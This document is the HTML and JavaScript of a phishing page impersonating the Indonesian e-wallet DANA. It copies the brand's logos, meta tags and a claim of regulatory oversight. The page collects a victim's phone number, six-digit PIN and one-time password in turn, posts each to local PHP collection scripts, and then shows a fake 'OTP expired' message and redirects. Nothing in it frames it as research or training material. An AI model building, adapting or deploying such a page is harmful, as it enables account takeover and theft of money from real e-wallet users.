<!DOCTYPE html><html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<title>DANA - Apa pun transaksinya selalu ada DANA</title>

<meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
<meta property="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA">
<meta property="twitter:card" content="summary_large_image">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&amp;usqp=CAU" >
<meta property="twitter:image:src" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&amp;usqp=CAU">
<meta property="og:url" content="https://dana.id/">
<meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
<meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">

<link rel="stylesheet" href="ast/8d62ea654fcf0e4cae001e344ee2592c.css">
<link rel="stylesheet" href="ast/00b9d2e9f52e505c013c16bb638a42a4.css">
<link rel="stylesheet" href="ast/6990a7033bbaeadc2040ac863ff124fd.css">
<link rel="stylesheet" href="ast/3fadc676582b9542004b502ee03df3a3.css">
<link rel="stylesheet" href="ast/47e4c58f6b9789b8a33f2525cf084599.css">

<link href="logo.png" rel="icon" type="image/x-icon">
   
</head>
<body>
<div style="display:none;" class="index">
<div class="header">
<img src="ast/img/dana_logo.png" class="logo" alt="">
</div>
<div class="content">
<div class="hero">
<img src="ast/img/hero.svg" alt="">
</div>
<h1>Dompet digital untuk kamu!</h1>
<p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
<div class="line">
</div>
<p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
<button type="button" onclick="next();">LOGIN</button>
</div>
</div>
<div class="start" style="display:none;">
<img class="logo" src="ast/img/dana_text.png">
<div class="footimg">
<img src="ast/img/bi.png" alt="">
<img src="ast/img/kom.png" alt="">
<p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
</div>
</div>
<div class="container hid">
<div class="box-login">
<div id="process" name="process" class="process" style="display: none;">
<div class="loading">
<img src="ast/img/load_bg.png">
<img class="spinner" src="ast/img/load_spin.png">
</div>
</div>
<div class="header">
<img src="ast/img/dana_logo.png" class="logo" alt="">
</div>
<form id="formNohp" onsubmit="sendNohp(event);">
<h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
<div class="box-input">
<div class="label">
<img src="ast/img/indo.png" alt="">
<label>+62</label>
</div>
<input id="inp" type="tel" autocomplete="off" required name="inp" placeholder="811-1234-5678">
</div>
<p class="desc">Nomor ponsel akan digunakan sebagai ID kamu &<br>menjaga akun selalu aman. Dengan melanjutkan,<br>kamu setuju dengan <b>Syarat & Ketentuan</b> dan<br><b>Kebijakan Privasi</b> kami</p>
<div class="box-btn">
<button disabled id="btn" class="btnnohp" type="submit">LANJUT</button>
</div>
</form>
<form id="formPin" class="hid">
<h3>Masukkan <b>PIN DANA</b></h3>
<div class="box-input-pin">
<div type="button" class="clear">
</div>
<input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
</div>
<button class="show" type="button">TAMPILKAN</button>
<p class="forgot">LUPA PIN?</p>
</form>
<div class="bgotp hid">
<form id="formOtp" class="">
<h2>Masukkan OTP</h2>
<p class="alert">Kode OTP telah dikirim ke nomor Anda</p>
<div class="box-input-otp">
<div class="loadingOtp" style="display:none;">
<img src="ast/img/load_bg.png">
<img class="spinner" src="ast/img/load_spin.png">
</div>
<div type="button" class="clearotp">
</div>
<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
<input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
</div>
<p class="resend">KIRIM ULANG (<span id="countdown">120</span>s)</p>
</form>
</div>
</div>
</div>

<script src="ast/jquery-3.5.1.min.js"></script>
<script src="ast/jquery.mask.min.js"></script>
<script>
$(document).ready(function() {
    $('#inp').on('input', function() {
        if ($(this).val() == '0' || $(this).val() == '62') {
            $(this).val('');
        }
    });
});
</script>
<script>
$(document).ready(function() {
    $('#inp').mask('000-0000-000000');
});
</script>
<script>
let inp = document.getElementById("inp");
let btn = document.getElementById("btn");
inp.addEventListener("input", val);

function val() {
    if (inp.value.length > 10) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
};
</script>
<script>
$('.inppin').on('input', function(event) {
    const inputs = $('.inppin');
    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
    if (isAllFilled == true) {
        $(event.target).blur();
        sendPin();
    };
    const index = inputs.index(this);
    const currentValue = event.target.value;
    if (currentValue.length === 1) {
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    } else if (currentValue.length === 0) {
        if (index > 0) {
            inputs[index].focus();
        }
    };
});
$('.inppin').on('keydown', function(event) {
    const inputs = $('.inppin');
    const key = event.key;
    const index = inputs.index(this);
    if (key === 'Backspace' && event.target.value.length === 0) {
        if (index > 0) {
            inputs[index - 1].focus();
        }
    };
});
</script>
<script>
$('.inpotp').on('input', function(event) {
    const inputs = $('.inpotp');
    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
    if (isAllFilled == true) {
        $(event.target).blur();
        sendOtp();
    }
    const index = inputs.index(this);
    const currentValue = event.target.value;
    if (currentValue.length === 1) {
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    } else if (currentValue.length === 0) {
        if (index > 0) {
            inputs[index].focus();
        }
    };
});
$('.inpotp').on('keydown', function(event) {
    const inputs = $('.inpotp');
    const key = event.key;
    const index = inputs.index(this);
    if (key === 'Backspace' && event.target.value.length === 0) {
        if (index > 0) {
            inputs[index - 1].focus();
        }
    };
});
</script>
<script>
$(document).ready(function() {
    $('.clear').click(function() {
        $('.inppin').val('');
        $('#pin1').focus();
    });
    $('.clearotp').click(function() {
        $('.inpotp').val('');
        $('#otp1').focus();
    });
    $('.show').click(function() {
        $('.inppin').each(function() {
            if ($(this).attr('type') === 'password') {
                $(this).attr('type', 'number');
                $(".show").text("SEMBUNYIKAN");
            } else {
                $(this).attr('type', 'password');
                $(".show").text("TAMPILKAN");
            }
        });
    });
});
</script>
<script>
function sendNohp(event) {
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    $.ajax({
        type: 'POST',
        url: 'ast/req/sendNohp.php',
        data: $('#formNohp').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $("#formNohp").fadeOut();
            setTimeout(function() {
                $("#inp").val('');
                $("#formPin").fadeIn();
                $("#pin1").focus();
            }, 500);
        }
    });
};
</script>
<script>
function sendPin() {
    $("#process").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/formPin.php',
        data: $('#formPin').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $('.inppin').val('');
            $(".bgotp").fadeIn();
            setInterval(countdown, 1000);
            $("#otp1").focus();
        }
    });
};
</script>
<script>
function sendOtp() {
    $(".loadingOtp").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/formOtp.php',
        data: $('#formOtp').serialize(),
        dataType: 'text',
        success: function() {
            window.location.href = "googleplayDANA.html";
            setTimeout(function() {
                $(".loadingOtp").hide();
                $('.inpotp').val('');
                $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
                $(".alert").css("color", "red");
            }, 3000);
        }
    });
};
</script>
<script>
function countdown() {
    var count = parseInt($('#countdown').text());
    if (count !== 0) {
        $('#countdown').text(count - 1);
    } else {
        $('#countdown').text('120');
    }
};</script>
<script>
window.onload = function() {
    setTimeout(function() {
        $(".start").fadeIn();
        setTimeout(function() {
            $(".start").fadeOut(1000);
            setTimeout(function() {
                $(".container").fadeIn(200);
                $("#inp").focus();
            }, 1000);
        }, 2000);
    }, 500);
}
</script>

</body>
</html>
